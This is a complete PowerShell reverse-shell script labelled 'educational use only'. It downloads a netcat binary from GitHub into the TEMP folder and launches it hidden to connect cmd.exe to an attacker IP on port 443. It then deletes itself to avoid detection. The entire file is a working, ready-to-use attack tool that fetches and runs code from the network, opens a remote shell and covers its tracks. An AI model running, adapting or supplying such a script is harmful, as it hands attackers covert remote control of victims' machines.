# mrmshell2.ps1 - Smart Reverse Shell (Auto 32/64-bit, TLS, Safe Cleanup)
# Educational use only

# 1. Enable TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'

# 2. Auto-detect architecture
$is64bit = [Environment]::Is64BitOperatingSystem
$ncUrl = if ($is64bit) {
    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe"
} else {
    "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe"
}

# 3. Settings
$ncPath     = "$env:TEMP\nc.exe"
$attackerIP = "192.168.1.104"
$port       = "443"

# 4. Download nc.exe
try {
    Write-Host "[+] Downloading nc.exe..." -ForegroundColor Green
    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
    Write-Host "[+] nc.exe downloaded: $ncPath" -ForegroundColor Green
} catch {
    Write-Error "Download failed: $($_.Exception.Message)"
    exit 1
}

# 5. Execute reverse shell
if (Test-Path $ncPath) {
    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden -NoNewWindow
}

# 6. Safe self-delete
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath -and (Test-Path $scriptPath)) {
    Start-Sleep -Seconds 2
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
}
